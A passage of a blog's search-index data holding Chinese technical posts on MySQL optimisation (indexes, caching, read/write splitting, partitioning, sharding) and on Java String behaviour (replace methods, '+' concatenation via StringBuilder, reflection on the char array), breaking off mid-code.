id=\"sql优化、索引\"><a href=\"#sql优化、索引\" class=\"headerlink\" title=\"sql优化、索引\"></a>sql优化、索引</h3><p>一般情况下都打开了mysql慢查询日志，记录超过阈值的sql，用于之后sql的优化。<br>在优化sql过程中，通过 <strong>执行计划</strong> 来判断时间花费在哪：</p>\n<ul>\n<li>判断索引是否生效</li>\n<li>是否需要新建索引</li>\n<li>是否应该创建多列索引</li>\n<li>是否需要创建临时表</li>\n<li>是否可以把多条sql合并为一条</li>\n<li>是否可以吧一条过于复杂sql拆分为不同sql，在应用中对数据进行合并</li>\n</ul>\n<p>带着问题去对相应的sql优化。</p>\n<h3 id=\"热点数据缓存\"><a href=\"#热点数据缓存\" class=\"headerlink\" title=\"热点数据缓存\"></a>热点数据缓存</h3><p>在项目中引入缓存入redis、memcached等缓存，对热点数据走缓存，避免数据库压力过大，同时可以引入本地缓存。<br>在使用缓存过程中可能会出现缓存击穿，因为使用缓存生效时间（不建议使用永久生效），这时可能会出现大量线程访问数据库导致数据库压力瞬间增大，严重可能导致数据库挂掉，可以在查询无返回值时，通过使用互斥锁，使一个线程去数据库同步数据到缓存，其他线程等待（设置等待超时时间）；还可以在获取缓存中数据时，判断超时时间，如果超过设置的阈值后同步数据库数据同时延长缓存时间。</p>\n<h3 id=\"读写分离\"><a href=\"#读写分离\" class=\"headerlink\" title=\"读写分离\"></a>读写分离</h3><p>读写分离适用于读远大于写，在使用读写分离时会出现读延迟的情况，如果对于某个业务要求较高，可以走写库。<br>以前公司读写分离好像是在数据库层进行区分，现在公司是通过在应用修改数据源达到读写分离的目的，通过拦截器判断Mapper中方法，切换不同的数据源，通过ThreadLocal存储连接池。在使用过程中需要需要测试如果配置事务后，事务是否生效，如果配置不当可能会出现事务失效的情况。</p>\n<h3 id=\"垂直切分\"><a href=\"#垂直切分\" class=\"headerlink\" title=\"垂直切分\"></a>垂直切分</h3><p>在前期设计的时候，可能所有业务都在一个库或者一个表中，导致表特别臃肿，这个时候可以对数据库进行垂直切分，如果是切分数据库，可以通过不同的业务对库进行拆分，对相应的代码进行重构。如果是对表进行拆分，可以把改表中非主要字段进行拆分放入另一张表中，因为这里需要变动应用操作数据库相关的代码，可能应用重构较多</p>\n<h3 id=\"分区\"><a href=\"#分区\" class=\"headerlink\" title=\"分区\"></a>分区</h3><p>在mysql中，数据库中的数据都是放入在一个文件中，随着数据的增长，该文件也会变得越来越大。mysql可以通过分区在把该文件拆分为多个文件，通过判断数据在哪个文件来对不同的文件进行查找，这就减少数据查询量。在物理上数据被拆分了，逻辑上还是一个表。<br>分区分为：RANGE、List、Hash、Key、子分区</p>\n<h4 id=\"RANGE分区\"><a href=\"#RANGE分区\" class=\"headerlink\" title=\"RANGE分区\"></a>RANGE分区</h4><p>根据范围分区，范围应该连续但是不重叠，使用PARTITION BY RANGE, VALUES LESS THAN关键字。不使用COLUMNS关键字时RANGE括号内必须为整数字段名或返回确定整数的函数。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 如果不加COLUMNS，则值必须为数字，加了COLUMNS后可以支持非整数和多列</span><br><span class=\"line\"><span class=\"keyword\">PARTITION</span> <span class=\"keyword\">BY</span> <span class=\"keyword\">RANGE</span> COLUMNS(字段名) (</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> p0 <span class=\"keyword\">VALUES</span> LESS THAN (<span class=\"string\">&#x27;1960-01-01&#x27;</span>),</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> p1 <span class=\"keyword\">VALUES</span> LESS THAN (<span class=\"string\">&#x27;1970-01-01&#x27;</span>),</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> p2 <span class=\"keyword\">VALUES</span> LESS THAN (<span class=\"string\">&#x27;1980-01-01&#x27;</span>),</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> p3 <span class=\"keyword\">VALUES</span> LESS THAN (<span class=\"string\">&#x27;1990-01-01&#x27;</span>),</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> p_max  <span class=\"keyword\">VALUES</span> LESS THAN MAXVALUE</span><br><span class=\"line\">);</span><br><span class=\"line\"># 或者</span><br><span class=\"line\"><span class=\"keyword\">ALTER TABLE</span> 表 <span class=\"keyword\">ADD</span> <span class=\"keyword\">PARTITION</span> (<span class=\"keyword\">PARTITION</span> p4 <span class=\"keyword\">VALUES</span> LESS THAN (<span class=\"string\">&#x27;2000-01-01&#x27;</span>));</span><br></pre></td></tr></table></figure>\n<p>一般在平常都是通过常用where条件中的字段对数据进行拆分。除了对单个字段进行拆分，还可以对多个字段进行拆分。</p>\n<h4 id=\"List分区\"><a href=\"#List分区\" class=\"headerlink\" title=\"List分区\"></a>List分区</h4><p>根据具体数值分区，每个分区数值不重叠，使用PARTITION BY LIST、VALUES IN关键字。跟Range分区类似，不使用COLUMNS关键字时List括号内必须为整数字段名或返回确定整数的函数。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PARTITION</span> <span class=\"keyword\">BY</span> LIST(字段) (</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> pNorth <span class=\"keyword\">VALUES</span> <span class=\"keyword\">IN</span> (<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>,<span class=\"number\">17</span>),</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> pEast <span class=\"keyword\">VALUES</span> <span class=\"keyword\">IN</span> (<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">19</span>,<span class=\"number\">20</span>),</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> pWest <span class=\"keyword\">VALUES</span> <span class=\"keyword\">IN</span> (<span class=\"number\">4</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">14</span>,<span class=\"number\">18</span>),</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> pCentral <span class=\"keyword\">VALUES</span> <span class=\"keyword\">IN</span> (<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">15</span>,<span class=\"number\">16</span>)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>数字List分区时，设置的字段值必须全面覆盖，如果插入一个不属于该分区的值会出错。同时可以通过添加<code>COLUMNS</code>支持非整数和多列。在进行批量插入时，如 <strong>values(),(),()</strong> 这种格式，其中有条数据没被覆盖，如果表引擎支持事务（Innodb）则都会失败，如果不支持事务则该未覆盖的数据之前数据会被插入，之后数据不会被插入。</p>\n<h4 id=\"Hash分区\"><a href=\"#Hash分区\" class=\"headerlink\" title=\"Hash分区\"></a>Hash分区</h4><p>Hash分区主要用来确保数据在预先确定数目的分区中平均分布，Hash括号内只能是整数列或返回确定整数的函数，实际上就是使用返回的整数对分区数取模。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PARTITION</span> <span class=\"keyword\">BY</span> HASH(字段)</span><br><span class=\"line\">PARTITIONS <span class=\"number\">4</span>;</span><br></pre></td></tr></table></figure>\n<p>通过对字段进行hash，之后拆分为多少份。使用Hash时，后期扩展较差。可以通过添加<code>LINEAR</code>关键字线性Hash分区，类似Hash一致。</p>\n<h4 id=\"Key分区\"><a href=\"#Key分区\" class=\"headerlink\" title=\"Key分区\"></a>Key分区</h4><p>Key分区和Hash分区类似，只是Key分区使用的哈希函数使用的事Mysql服务器提供。使用只要把<code>HASH</code>改为<code>KEY</code>即可。</p>\n<h4 id=\"子分区\"><a href=\"#子分区\" class=\"headerlink\" title=\"子分区\"></a>子分区</h4><p>子分区是将每个分区再次分割。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE TABLE</span> ts (id <span class=\"type\">INT</span>, purchased <span class=\"type\">DATE</span>)</span><br><span class=\"line\">    <span class=\"keyword\">PARTITION</span> <span class=\"keyword\">BY</span> <span class=\"keyword\">RANGE</span>( <span class=\"keyword\">YEAR</span>(purchased) )</span><br><span class=\"line\">    SUBPARTITION <span class=\"keyword\">BY</span> HASH( TO_DAYS(purchased) ) (</span><br><span class=\"line\">        <span class=\"keyword\">PARTITION</span> p0 <span class=\"keyword\">VALUES</span> LESS THAN (<span class=\"number\">1990</span>) (</span><br><span class=\"line\">            SUBPARTITION s0</span><br><span class=\"line\">                DATA DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk0/data&#x27;</span></span><br><span class=\"line\">                INDEX DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk0/idx&#x27;</span>,</span><br><span class=\"line\">            SUBPARTITION s1</span><br><span class=\"line\">                DATA DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk1/data&#x27;</span></span><br><span class=\"line\">                INDEX DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk1/idx&#x27;</span></span><br><span class=\"line\">        ),</span><br><span class=\"line\">        <span class=\"keyword\">PARTITION</span> p1 <span class=\"keyword\">VALUES</span> LESS THAN (<span class=\"number\">2000</span>) (</span><br><span class=\"line\">            SUBPARTITION s2</span><br><span class=\"line\">                DATA DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk2/data&#x27;</span></span><br><span class=\"line\">                INDEX DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk2/idx&#x27;</span>,</span><br><span class=\"line\">            SUBPARTITION s3</span><br><span class=\"line\">                DATA DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk3/data&#x27;</span></span><br><span class=\"line\">                INDEX DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk3/idx&#x27;</span></span><br><span class=\"line\">        ),</span><br><span class=\"line\">        <span class=\"keyword\">PARTITION</span> p2 <span class=\"keyword\">VALUES</span> LESS THAN MAXVALUE (</span><br><span class=\"line\">            SUBPARTITION s4</span><br><span class=\"line\">                DATA DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk4/data&#x27;</span></span><br><span class=\"line\">                INDEX DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk4/idx&#x27;</span>,</span><br><span class=\"line\">            SUBPARTITION s5</span><br><span class=\"line\">                DATA DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk5/data&#x27;</span></span><br><span class=\"line\">                INDEX DIRECTORY <span class=\"operator\">=</span> <span class=\"string\">&#x27;/disk5/idx&#x27;</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br></pre></td></tr></table></figure>\n<p>使用子分区的时候，每个子分区的数量必须相同。如果在一个分区表上的任何分区上使用<code>SUBPARTITION</code>来明确定义任何子分区，那么就必须定义所有的子分区，且必须指定一个全表唯一的名字。</p>\n<p>在对数据进行分区后，如果查询条件依旧很慢，可以通过执行计划来分析。</p>\n<p>在分区完成后，后续需要对分区进行操作时可以对分区进行删除、合并、新增，删除有两种<code>REMOVE</code>和<code>DROP</code>，<code>REMOVE</code>不会删除分区，只会删除分区的结构，<code>DROP</code>会连数据都删除。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL2hhaXRpYW4yOTkuZ2l0aHViLmlvLzIwMTYvMDUvMjYvbXlzcWwtcGFydGl0aW9uaW5nLw==\">MySQL分区与传统的分库分表<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"分库、分表\"><a href=\"#分库、分表\" class=\"headerlink\" title=\"分库、分表\"></a>分库、分表</h3><p>当分区已经无法满足业务需求时，这时需要对数据库进行分库、分表。</p>\n<h4 id=\"Hash拆分\"><a href=\"#Hash拆分\" class=\"headerlink\" title=\"Hash拆分\"></a>Hash拆分</h4><p>对数据库中某个字段或者多个字段进行Hash后进行取模，通过获取到的值，分配到不同的库和表中，这种拆分比较简便。<br>如现在有个评论表，评论中有用户的唯一ID，通过对用户的ID进行Hash，通过Hash取模后分配到指定的库和表中，这种在Insert的时候和Select的时候可以直接在应用中通过之前设计的Hash算法查询不同的数据库。<br>这种有个缺陷，如果后续数据持续的增长之前设计的拆分数量不够，这时需要重新拆分，这样迁移的数据会比较多，影响也比较大。</p>\n<p>可以过Hash一致算法来避免后续新增库表时导致大量数据迁移。</p>\n<h4 id=\"存储拆分的值和库表映射关系\"><a href=\"#存储拆分的值和库表映射关系\" class=\"headerlink\" title=\"存储拆分的值和库表映射关系\"></a>存储拆分的值和库表映射关系</h4><p>拆分时，设计一个主库，存储拆分的字段和对应库表关系，在查询时先通过调节查询到本次查询的数据需要从哪个库表进行查询，之后在到指定的库表查询具体的值，需要查询2次。如：现在有多个门店，每个门店都有自己的商品，已经销量等数据。通过一张主表维护门店信息，查询出门店数据所在库表后，再查询需要查询的数据。这种情况下，如果需要新增一个门店，可以把门店在主库的映射表中把添加门店映射，比较方便。这种缺陷在于需要查询两次数据库，会有性能消耗，一般这种可以通过依赖第三方库(当当sharding-jdbc-core)，简化数据库操作。</p>\n<p>在对数据进行分库、分表的时候，为了不影响用户的使用，通常可以通过双写来做数据迁移，以旧库为主，新库为辅，同时通过定时对数据进行检测避免双写失败，同时需要做到随时对库进行切换。</p>\n","categories":["mysql"],"tags":["优化","分库","分区","分表"]},{"title":"Java基础-String","url":"/2018/03/22/Java%E5%9F%BA%E7%A1%80-String/","content":"<p>平常基本类型+String是在代码中使用最多的地方。分析下String特别的地方。</p>\n<h3 id=\"字符串替换\"><a href=\"#字符串替换\" class=\"headerlink\" title=\"字符串替换\"></a>字符串替换</h3><p>String的字符串替换有3个方法：replace、replaceFirst、replaceAll</p>\n<h4 id=\"replace\"><a href=\"#replace\" class=\"headerlink\" title=\"replace\"></a>replace</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">replace</span><span class=\"params\">(<span class=\"type\">char</span> oldChar, <span class=\"type\">char</span> newChar)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">replace</span><span class=\"params\">(CharSequence target, CharSequence replacement)</span></span><br></pre></td></tr></table></figure>\n<p>String.replace有两个重载方法，一个参数是char、一个是CharSequence<br>第一个replace是通过原有String中char数组生成一个新数组，然后把新数组中的oldChar替换为newChar，返回一个新的String</p>\n<ul>\n<li>注：如果oldChar&#x3D;&#x3D;newChar返回的是this。</li>\n</ul>\n<p>第二个relace参数是CharSequence，String是其实现类，所以平常一般传的参数是String（不过StringBuffer、StringBuilder也是该接口实现类）。该replace实现虽然是通过Pattern，但是在使用Pattern的时候，设置了<code>Pattern.LITERAL和Matcher.quoteReplacement</code>，所以转义是不起效的。</p>\n<p>所以对于replace而言，就是 <strong>替换所有</strong> 符合的字符，无转义，无正则表达式（设置Pattern转义失效）。</p>\n<span id=\"more\"></span>\n<h4 id=\"replaceAll\"><a href=\"#replaceAll\" class=\"headerlink\" title=\"replaceAll\"></a>replaceAll</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">replaceAll</span><span class=\"params\">(String regex, String replacement)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Pattern.compile(regex).matcher(<span class=\"built_in\">this</span>).replaceAll(replacement);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>replaceAll就是纯粹的通过正则表达式替换</p>\n<h4 id=\"replaceFirst\"><a href=\"#replaceFirst\" class=\"headerlink\" title=\"replaceFirst\"></a>replaceFirst</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">replaceFirst</span><span class=\"params\">(String regex, String replacement)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Pattern.compile(regex).matcher(<span class=\"built_in\">this</span>).replaceFirst(replacement);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>再使用replace或者replaceAll的时候，是替换所有匹配的字符串，如果不需要匹配全部，可以通过replaceFirst尝试值替换第一个。不过replaceFirst的匹配模式也是通过正则表达式。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//示例</span></span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.whh.String&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(str.replace(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>));<span class=\"comment\">//  com/whh/String</span></span><br><span class=\"line\">System.out.println(str.replace(<span class=\"string\">&quot;.&quot;</span>, <span class=\"string\">&quot;$0&quot;</span>));<span class=\"comment\">// com$0whh$0String</span></span><br><span class=\"line\">System.out.println(str.replaceAll(<span class=\"string\">&quot;.&quot;</span>, <span class=\"string\">&quot;$0&quot;</span>));<span class=\"comment\">//  com.whh.String</span></span><br><span class=\"line\">System.out.println(str.replaceFirst(<span class=\"string\">&quot;.&quot;</span>, <span class=\"string\">&quot;$0&quot;</span>));<span class=\"comment\">//  com.whh.String</span></span><br><span class=\"line\">System.out.println(str.replace(<span class=\"string\">&quot;.&quot;</span>, <span class=\"string\">&quot;/&quot;</span>));<span class=\"comment\">//  com/whh/String</span></span><br><span class=\"line\">System.out.println(str.replaceAll(<span class=\"string\">&quot;.&quot;</span>, <span class=\"string\">&quot;/&quot;</span>));<span class=\"comment\">// //////////////</span></span><br><span class=\"line\">System.out.println(str.replaceFirst(<span class=\"string\">&quot;.&quot;</span>, <span class=\"string\">&quot;/&quot;</span>));<span class=\"comment\">// /om.whh.String</span></span><br></pre></td></tr></table></figure>\n\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9teS5vc2NoaW5hLm5ldC91LzgxNjU3Ni9ibG9nLzM2OTY0Mw==\">java字符串的替换replace、replaceAll、replaceFirst的区别详解<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"String-“-”\"><a href=\"#String-“-”\" class=\"headerlink\" title=\"String “+”\"></a>String “+”</h3><p>在Java中是不支持运算符重载的，但是在平常使用过程中拼接字符串时，我们都是通过<code>+</code>来对字符串做相关操作，这是一种错觉。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//例子</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>&#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">a</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">b</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;.&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> a + b + <span class=\"string\">&quot;whh&quot;</span> + b + <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在上述代码中使用的<code>+</code>拼接的字符串，之后通过<code>javac</code>编译代码生成class文件，通过命令<code>javap -c Main.class</code>对class进行反汇编。得到如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Compiled from <span class=\"string\">&quot;Main.java&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"title function_\">Main</span><span class=\"params\">()</span>;</span><br><span class=\"line\">    Code:</span><br><span class=\"line\">       <span class=\"number\">0</span>: aload_0</span><br><span class=\"line\">       <span class=\"number\">1</span>: invokespecial #<span class=\"number\">1</span>                  <span class=\"comment\">// Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class=\"line\">       <span class=\"number\">4</span>: <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(java.lang.String[])</span>;</span><br><span class=\"line\">    Code:</span><br><span class=\"line\">       <span class=\"number\">0</span>: ldc           #<span class=\"number\">2</span>                  <span class=\"comment\">// String com</span></span><br><span class=\"line\">       <span class=\"number\">2</span>: astore_1</span><br><span class=\"line\">       <span class=\"number\">3</span>: ldc           #<span class=\"number\">3</span>                  <span class=\"comment\">// String .</span></span><br><span class=\"line\">       <span class=\"number\">5</span>: astore_2</span><br><span class=\"line\">       <span class=\"number\">6</span>: <span class=\"keyword\">new</span>           #<span class=\"number\">4</span>                  <span class=\"comment\">// class java/lang/StringBuilder</span></span><br><span class=\"line\">       <span class=\"number\">9</span>: dup</span><br><span class=\"line\">      <span class=\"number\">10</span>: invokespecial #<span class=\"number\">5</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class=\"line\">      <span class=\"number\">13</span>: aload_1</span><br><span class=\"line\">      <span class=\"number\">14</span>: invokevirtual #<span class=\"number\">6</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span></span><br><span class=\"line\">      <span class=\"number\">17</span>: aload_2</span><br><span class=\"line\">      <span class=\"number\">18</span>: invokevirtual #<span class=\"number\">6</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span></span><br><span class=\"line\">      <span class=\"number\">21</span>: ldc           #<span class=\"number\">7</span>                  <span class=\"comment\">// String whh</span></span><br><span class=\"line\">      <span class=\"number\">23</span>: invokevirtual #<span class=\"number\">6</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span></span><br><span class=\"line\">      <span class=\"number\">26</span>: aload_2</span><br><span class=\"line\">      <span class=\"number\">27</span>: invokevirtual #<span class=\"number\">6</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span></span><br><span class=\"line\">      <span class=\"number\">30</span>: ldc           #<span class=\"number\">8</span>                  <span class=\"comment\">// String test</span></span><br><span class=\"line\">      <span class=\"number\">32</span>: invokevirtual #<span class=\"number\">6</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span></span><br><span class=\"line\">      <span class=\"number\">35</span>: invokevirtual #<span class=\"number\">9</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.toString:()Ljava/lang/String;</span></span><br><span class=\"line\">      <span class=\"number\">38</span>: astore_3</span><br><span class=\"line\">      <span class=\"number\">39</span>: <span class=\"keyword\">return</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述返回编译后可以看到编译成Class后实际是通过StringBuilder来进行拼接的字符串。<br>如果代码修改为如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>&#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">a</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com&quot;</span>;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt;=<span class=\"number\">10</span>; i++)&#123;</span><br><span class=\"line\">    \t\t\ta += a;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在for循环中拼接字符串，通过反编译可以得到：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Compiled from <span class=\"string\">&quot;Main.java&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"title function_\">Main</span><span class=\"params\">()</span>;</span><br><span class=\"line\">    Code:</span><br><span class=\"line\">       <span class=\"number\">0</span>: aload_0</span><br><span class=\"line\">       <span class=\"number\">1</span>: invokespecial #<span class=\"number\">1</span>                  <span class=\"comment\">// Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class=\"line\">       <span class=\"number\">4</span>: <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(java.lang.String[])</span>;</span><br><span class=\"line\">    Code:</span><br><span class=\"line\">       <span class=\"number\">0</span>: ldc           #<span class=\"number\">2</span>                  <span class=\"comment\">// String com</span></span><br><span class=\"line\">       <span class=\"number\">2</span>: astore_1</span><br><span class=\"line\">       <span class=\"number\">3</span>: iconst_0</span><br><span class=\"line\">       <span class=\"number\">4</span>: istore_2</span><br><span class=\"line\">       <span class=\"number\">5</span>: iload_2</span><br><span class=\"line\">       <span class=\"number\">6</span>: bipush        <span class=\"number\">10</span></span><br><span class=\"line\">       <span class=\"number\">8</span>: if_icmpgt     <span class=\"number\">36</span></span><br><span class=\"line\">      <span class=\"number\">11</span>: <span class=\"keyword\">new</span>           #<span class=\"number\">3</span>                  <span class=\"comment\">// class java/lang/StringBuilder</span></span><br><span class=\"line\">      <span class=\"number\">14</span>: dup</span><br><span class=\"line\">      <span class=\"number\">15</span>: invokespecial #<span class=\"number\">4</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class=\"line\">      <span class=\"number\">18</span>: aload_1</span><br><span class=\"line\">      <span class=\"number\">19</span>: invokevirtual #<span class=\"number\">5</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span></span><br><span class=\"line\">      <span class=\"number\">22</span>: aload_1</span><br><span class=\"line\">      <span class=\"number\">23</span>: invokevirtual #<span class=\"number\">5</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span></span><br><span class=\"line\">      <span class=\"number\">26</span>: invokevirtual #<span class=\"number\">6</span>                  <span class=\"comment\">// Method java/lang/StringBuilder.toString:()Ljava/lang/String;</span></span><br><span class=\"line\">      <span class=\"number\">29</span>: astore_1</span><br><span class=\"line\">      <span class=\"number\">30</span>: iinc          <span class=\"number\">2</span>, <span class=\"number\">1</span></span><br><span class=\"line\">      <span class=\"number\">33</span>: <span class=\"keyword\">goto</span>          <span class=\"number\">5</span></span><br><span class=\"line\">      <span class=\"number\">36</span>: <span class=\"keyword\">return</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看Code标记33，goto5，这里表示for循环，在Code标记11地方会创建一个StringBuilder，也就是每次for循环都会创建一个StringBuilder对象，比较浪费，可以通过在for循环外卖创建StringBuilder后在for循环内通过append拼接字符串。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZGV4dHJhZF9paGFja2VyL2FydGljbGUvZGV0YWlscy81MzA1NTcwOQ==\">Java 深究字符串String类(1)之运算符”+”重载<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"String不可变\"><a href=\"#String不可变\" class=\"headerlink\" title=\"String不可变\"></a>String不可变</h3><p>在String中通过char[]表达一个字符串，char数组被final修饰，这也表示了单String被初始化后char数组就不能在被修改。而且String类也是final修饰，表示该类不可被继承。<br>正常情况下不可以修改，不过因为final修饰的是数组，数组引用不可修改，但是数组的值却可以修改，可以通过反射修改char数组中的值。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    Set&lt;String&gt; set = <span class=\"keyword\">new</span> <span class=\"title class_\">HashSet</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">a</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;whh&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">b</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;www&quot;</span>;</span><br><span class=\"line\">    set.add(a);</span><br><span class=\"line\">    set.add(b);</span><br><span class=\"line\">    <span class=\"type\">Field</span> <span class=\"variable\">value</span> <span class=\"operator\">=</span> String.class.getDeclaredField(<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">    value.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span>[] chars = (<span class=\"type\">char</span>[]) value.get(b);</span><br><span class=\"line\">    Array.set(chars, <span class=\"number\">1</span>, <span 